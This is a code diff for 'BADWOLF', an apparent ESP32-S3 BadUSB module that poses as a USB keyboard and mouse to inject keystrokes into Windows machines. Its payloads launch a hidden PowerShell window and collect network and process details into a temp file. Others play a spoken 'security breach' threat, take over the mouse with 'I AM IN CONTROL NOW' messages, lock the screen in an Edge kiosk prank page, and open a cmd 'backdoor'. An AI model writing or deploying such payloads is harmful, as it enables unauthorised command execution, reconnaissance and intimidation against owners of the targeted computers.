@@ -1,18 +1,22 @@
 /*
- * NOCTURNE_OS — BADWOLF USB HID: Matrix (short) and Sniffer (long) payloads.
- * Uses USB.h + USBHIDKeyboard.h (ESP32-S3 native USB). Builds on non-S3 when
- * header is missing (USB code is no-op).
+ * NOCTURNE_OS — BADWOLF USB HID: Chaos & PsyOps.
+ * Uses USB.h + USBHIDKeyboard.h + USBHIDMouse.h
  */
 #include "UsbManager.h"
 
-#if __has_include("USBHIDKeyboard.h")
+// Проверка наличия библиотек.
+// Если их нет, код превращается в тыкву (пустышку), чтобы не ломать сборку.
+#if __has_include("USBHIDKeyboard.h") && __has_include("USBHIDMouse.h")
 #include "USB.h"
 #include "USBHIDKeyboard.h"
+#include "USBHIDMouse.h"
 
 static USBHIDKeyboard *s_keyboard = nullptr;
+static USBHIDMouse *s_mouse = nullptr;
 #define HAVE_USB_HID 1
 #else
 #define HAVE_USB_HID 0
+#warning "USB HID libraries not found. BadUSB features disabled."
 #endif
 
 UsbManager::UsbManager() {}
@@ -22,28 +26,27 @@ void UsbManager::begin() {
   if (active_)
     return;
 
-  // Правильный порядок инициализации для ESP32-S3
-  // КРИТИЧНО: Keyboard.begin() должен быть вызван ПЕРЕД USB.begin()
   if (!s_keyboard)
     s_keyboard = new USBHIDKeyboard();
+  if (!s_mouse)
+    s_mouse = new USBHIDMouse();
 
-  if (!s_keyboard) {
-    Serial.println("[BADWOLF] ERROR: Failed to create keyboard object");
+  if (!s_keyboard || !s_mouse) {
+    Serial.println("[BADWOLF] CRITICAL: Alloc failed.");
     return;
   }
 
-  // Сначала инициализируем HID клавиатуру
   s_keyboard->begin();
-  delay(300); // Дать время на инициализацию HID
+  s_mouse->begin();
+  delay(300);
 
-  // Теперь инициализируем USB
   USB.begin();
-  delay(1000); // Увеличить задержку для стабилизации USB
+  delay(1000); // Ждем драйверы
 
   active_ = true;
-  Serial.println("[BADWOLF] USB HID Keyboard ARMED.");
+  Serial.println("[BADWOLF] HID ARMED. Ready to hunt.");
 #else
-  Serial.println("[BADWOLF] USB not supported on this board.");
+  Serial.println("[BADWOLF] USB hardware not supported.");
 #endif
 }
 
@@ -51,37 +54,29 @@ void UsbManager::stop() {
 #if HAVE_USB_HID
   if (!active_)
     return;
-  if (s_keyboard) {
+  if (s_keyboard)
     s_keyboard->end();
-    delete s_keyboard;
-    s_keyboard = nullptr;
-  }
+  if (s_mouse)
+    s_mouse->end();
   active_ = false;
-  Serial.println("[BADWOLF] USB HID disarmed.");
+  Serial.println("[BADWOLF] Disarmed.");
 #endif
 }
 
 #if HAVE_USB_HID
-void UsbManager::ensureEnglishLayout() {
+void UsbManager::openRunDialog() {
   if (!s_keyboard)
     return;
-  s_keyboard->press(KEY_LEFT_ALT);
-  s_keyboard->press(KEY_LEFT_SHIFT);
-  yield(); // Allow USB HID to process key press
+  s_keyboard->press(KEY_LEFT_GUI);
+  s_keyboard->press('r');
+  delay(100);
   s_keyboard->releaseAll();
-  yield(); // Allow USB HID to process key release
+  delay(BADWOLF_DELAY_AFTER_RUN_MS);
 }
 
 void UsbManager::openPowerShell() {
-  if (!s_keyboard)
-    return;
-  ensureEnglishLayout();
-  yield(); // Allow USB HID to process layout change
-  s_keyboard->press(KEY_LEFT_GUI);
-  s_keyboard->press('r');
-  s_keyboard->releaseAll();
-  delay(BADWOLF_DELAY_AFTER_RUN_MS);
-  s_keyboard->print("powershell");
+  openRunDialog();
+  s_keyboard->print("powershell -WindowStyle Hidden");
   delay(300);
   s_keyboard->press(KEY_RETURN);
   s_keyboard->releaseAll();
@@ -93,17 +88,24 @@ void UsbManager::runMatrix() {
 #if HAVE_USB_HID
   if (!s_keyboard || !active_)
     return;
-  openPowerShell();
-  const char *msg = "NOCTURNE_OS // BADWOLF // MATRIX STALKER";
-  for (size_t i = 0; msg[i]; i++) {
-    s_keyboard->write((uint8_t)msg[i]);
-    delay(BADWOLF_MATRIX_CHAR_DELAY_MS);
-  }
+
+  openRunDialog();
+  s_keyboard->print("powershell");
+  delay(200);
   s_keyboard->press(KEY_RETURN);
   s_keyboard->releaseAll();
-  Serial.println("[BADWOLF] Matrix payload sent.");
-#else
-  (void)0;
+  delay(1000);
+
+  s_keyboard->println("color 0a");
+  s_keyboard->println("cls");
+  const char *msg = "Wake up, Rudy... The System is compromised.";
+  for (size_t i = 0; msg[i]; i++) {
+    s_keyboard->write((uint8_t)msg[i]);
+    delay(random(30, 100));
+  }
+  delay(800);
+  s_keyboard->println("");
+  s_keyboard->println("NOCTURNE_OS // INJECTION_COMPLETE");
 #endif
 }
 
@@ -112,16 +114,104 @@ void UsbManager::runSniffer() {
   if (!s_keyboard || !active_)
     return;
   openPowerShell();
-  // Pipe systeminfo, whoami, ipconfig to temp file and open in Notepad
-  const char *cmd = "systeminfo; whoami; ipconfig | Out-File -FilePath "
-                    "$env:TEMP\\sniff.txt; notepad $env:TEMP\\sniff.txt";
-  s_keyboard->print(cmd);
+  // Собираем IP, процессы и инфо о системе в файл
+  s_keyboard->print(
+      "Get-NetIPAddress | Out-File $env:TEMP\\net.txt; Get-Process | "
+      "Select-Object Name, CPU | Sort-Object CPU -Descending | Select-Object "
+      "-First 10 >> $env:TEMP\\net.txt; notepad $env:TEMP\\net.txt");
+  s_keyboard->press(KEY_RETURN);
+  s_keyboard->releaseAll();
+#endif
+}
+
+void UsbManager::runVoice() {
+#if HAVE_USB_HID
+  if (!s_keyboard || !active_)
+    return;
+  openPowerShell();
+
+  // TTS Injection
+  const char *script = "$v = New-Object -ComObject SAPI.SpVoice; "
+                       "$v.Volume = 100; "
+                       "$v.Rate = 0; "
+                       "$v.Speak('Warning. Security breach detected. Bad Wolf "
+                       "protocol initiated. Run, Rudy, run.');";
+
+  s_keyboard->print(script);
+  s_keyboard->press(KEY_RETURN);
+  s_keyboard->releaseAll();
+  Serial.println("[BADWOLF] Voice payload sent.");
+#endif
+}
+
+void UsbManager::runPoltergeist() {
+#if HAVE_USB_HID
+  if (!s_keyboard || !s_mouse || !active_)
+    return;
+
+  openRunDialog();
+  s_keyboard->print("notepad");
   delay(200);
   s_keyboard->press(KEY_RETURN);
   s_keyboard->releaseAll();
-  Serial.println("[BADWOLF] Sniffer payload sent.");
-#else
-  (void)0;
+  delay(1000);
+
+  s_keyboard->println("DO NOT TOUCH THE MOUSE.");
+  s_keyboard->println("I AM IN CONTROL NOW.");
+  delay(1000);
+
+  // 10-15 секунд хаоса
+  for (int i = 0; i < 30; i++) {
+    int x = random(-200, 200);
+    int y = random(-200, 200);
+    s_mouse->move(x, y);
+
+    if (i % 8 == 0)
+      s_keyboard->print(" HELP ");
+    if (i % 10 == 0)
+      s_mouse->move(0, 0, random(-5, 5)); // Скролл
+
+    delay(200);
+  }
+
+  s_keyboard->println("\n\n...System failure imminent.");
+  Serial.println("[BADWOLF] Poltergeist finished.");
+#endif
+}
+
+void UsbManager::runFakeUpdate() {
+#if HAVE_USB_HID
+  if (!s_keyboard || !active_)
+    return;
+
+  openRunDialog();
+  // Запуск браузера в режиме киоска (на весь экран, без выхода)
+  const char *cmd = "start msedge --kiosk \"https://geekprank.com/hacker/\" "
+                    "--edge-kiosk-type=fullscreen";
+
+  s_keyboard->print(cmd);
+  s_keyboard->press(KEY_RETURN);
+  s_keyboard->releaseAll();
+
+  Serial.println("[BADWOLF] Fake Update/Hacker screen launched.");
+#endif
+}
+
+// RESTORED LEGACY METHOD
+void UsbManager::runBackdoor() {
+#if HAVE_USB_HID
+  if (!s_keyboard || !active_)
+    return;
+
+  openRunDialog();
+  delay(200);
+
+  s_keyboard->print("cmd");
+  delay(100);
+  s_keyboard->press(KEY_RETURN);
+  s_keyboard->releaseAll();
+
+  Serial.println("[BADWOLF] Backdoor (cmd) opened.");
 #endif
 }
 
@@ -129,6 +219,9 @@ void UsbManager::runDuckyScript(int index) {
 #if HAVE_USB_HID
   if (!s_keyboard || !active_)
     return;
+
+  Serial.printf("[BADWOLF] Payload Index: %d\n", index);
+
   switch (index) {
   case 0:
     runMatrix();
@@ -136,56 +229,18 @@ void UsbManager::runDuckyScript(int index) {
   case 1:
     runSniffer();
     break;
-  case 2: {
-    ensureEnglishLayout();
-    delay(100);
-    s_keyboard->press(KEY_LEFT_GUI);
-    s_keyboard->press('r');
-    s_keyboard->releaseAll();
-    delay(600);
-    s_keyboard->print("cmd");
-    delay(200);
-    s_keyboard->press(KEY_RETURN);
-    s_keyboard->releaseAll();
-    Serial.println("[BADWOLF] Ducky: CMD.");
+  case 2:
+    runVoice();
     break;
-  }
-  case 3: {
-    openPowerShell();
-    s_keyboard->print(
-        "Get-Process | Out-File $env:TEMP\\p.txt; notepad $env:TEMP\\p.txt");
-    delay(200);
-    s_keyboard->press(KEY_RETURN);
-    s_keyboard->releaseAll();
-    Serial.println("[BADWOLF] Ducky: Process list.");
+  case 3:
+    runPoltergeist();
     break;
-  }
   case 4:
-    runBackdoor();
+    runFakeUpdate();
     break;
   default:
     runMatrix();
     break;
   }
-#else
-  (void)index;
-#endif
-}
-
-void UsbManager::runBackdoor() {
-#if HAVE_USB_HID
-  if (!s_keyboard || !active_)
-    return;
-  ensureEnglishLayout();
-  delay(80);
-  s_keyboard->press(KEY_LEFT_GUI);
-  s_keyboard->press('r');
-  s_keyboard->releaseAll();
-  delay(500);
-  s_keyboard->print("cmd");
-  delay(150);
-  s_keyboard->press(KEY_RETURN);
-  s_keyboard->releaseAll();
-  Serial.println("[BADWOLF] Backdoor (cmd) sent.");
 #endif
 }
